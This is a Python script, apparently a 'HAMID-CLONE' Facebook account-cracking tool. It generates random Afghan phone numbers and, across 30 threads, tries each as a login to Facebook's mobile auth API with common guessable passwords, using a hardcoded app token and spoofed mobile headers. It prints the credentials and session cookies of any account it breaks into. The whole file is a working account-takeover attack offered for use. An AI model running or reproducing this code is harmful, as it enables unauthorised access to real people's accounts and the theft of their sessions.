import os,time,random,string,sys,uuid,json
from concurrent.futures import ThreadPoolExecutor

import requests

numbs = []
loop=0
ok_ids=[]
cp_ids=[]
G = '\033[32m'
W = '\033[37m'
R =  '\033[31m'



logo =f'''{G} 
   $$\   $$\  $$$$$$\  $$\      $$\ $$$$$$\ $$$$$$$\  
   $$ |  $$ |$$  __$$\ $$$\    $$$ |\_$$  _|$$  __$$\ 
   $$ |  $$ |$$ /  $$ |$$$$\  $$$$ |  $$ |  $$ |  $$ |
   $$$$$$$$ |$$$$$$$$ |$$\$$\$$ $$ |  $$ |  $$ |  $$ |
   $$  __$$ |$$  __$$ |$$ \$$$  $$ |  $$ |  $$ |  $$ |
   $$ |  $$ |$$ |  $$ |$$ |\$  /$$ |  $$ |  $$ |  $$ |
   $$ |  $$ |$$ |  $$ |$$ | \_/ $$ |$$$$$$\ $$$$$$$  |
   \__|  \__|\__|  \__|\__|     \__|\______|\_______/{W}'''

def clear():
	os.system('clear')
	print(logo)

def line():
	print(f' |----------------------------------------------------')

def hamid():
	clear()
	line()
	print(f' | [1]{G} Random Cloning{W}')
	print(f' | [2]{G} Contact Admin{W}')
	print(f' | [3]{R} Exit Program{W}')
	line()
	inp = str(input(' | Choose : ')).strip()
	if inp in ['1','01']:
		randomClone()
	elif inp in ['2','02']:
		os.system('xdg-open https://t.me/hamid_naseri')
	elif inp in ['3','03']:
		print(' | Have a nice day')
		exit()
	else:
		print(' | option not found in menu')
		time.sleep(2)
		main()
	

def randomClone():
	clear()
	line()
	print(' | Codes for AFG : 078, 079, 074, 072, 070')
	print(' | Codes for worldwide : 9378, 9379, 9374, 9372')
	line()
	inp = str(input(' | Choose Code : '))
	try:
		limit = int(input(' | Put Limit : '))
	except:
		limit = 5000
	for _ in range(limit):
		numb = ''.join(random.choice(string.digits) for _ in range(7))
		numbs.append(numb)
	with ThreadPoolExecutor(max_workers = 30) as zahid:
		clear()
		line()
		ran = str(len(numbs))
		print(' | Method : Random Cloning')
		print(f' | Limit : {ran}')
		print(' | ON/OF Airplane mode before use')
		line()
		for number in numbs:
			ids = inp + number
			passwords = [number,ids,'۱۲۳۴۵۶','afghanistan','afg123','Afghanistan','afghan123','kabul123']
			zahid.submit(startClone,ids,passwords)
     

def startClone(ids,passwords):
	try:
		global loop
		sys.stdout.write(f'\r | [HAMID-CLONE] %s/%s/%s'%(loop,len(ok_ids),len(cp_ids)))
		for pas in passwords:
			useragent=''
			data={
                                'adid': str(uuid.uuid4()),
                                'format': 'json',
                                'device_id': str(uuid.uuid4()),
                                'email': ids,
                                'password': pas,
                                'generate_analytics_claims': '1',
                                'community_id': '',
                                'cpl': 'true',
                                'try_num': '1',
                                'family_device_id': str(uuid.uuid4()),
                                'credentials_type': 'password',
                                'source': 'login',
                                'error_detail_type': 'button_with_disabled',
                                'enroll_misauth': 'false',
                                'generate_session_cookies': '1',
                                'generate_machine_id': '1',
                                'currently_logged_in_userid': '0',
                                'locale': 'en_GB',
                                'client_country_code': 'GB',
                                'fb_api_req_friendly_name': 'authenticate'}
			header ={
                                'User-Agent': useragent,
                                'Accept-Encoding':  'gzip, deflate',
                                'Accept': '*/*',
                                'Connection': 'keep-alive',
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Friendly-Name': 'authenticate',
                                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'}
			url = 'https://b-api.facebook.com/method/auth.login'
			data1 = requests.post(url,data=data,headers=header).text
			data2 = json.loads(data1)
			if 'session_key' in data2:
				print(f'\r | [HAMID-OK] {ids} | {pas}')
				cookie = ";".join(_['name']+'='+_['value'] for _ in data2['session_cookies'])
				print(f'\r | [COOKIE] : {cookie}')
				ok_ids.append(ids)
				break
			else:pass
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
		pass
	except Exception as error:
		print(error)




hamid()
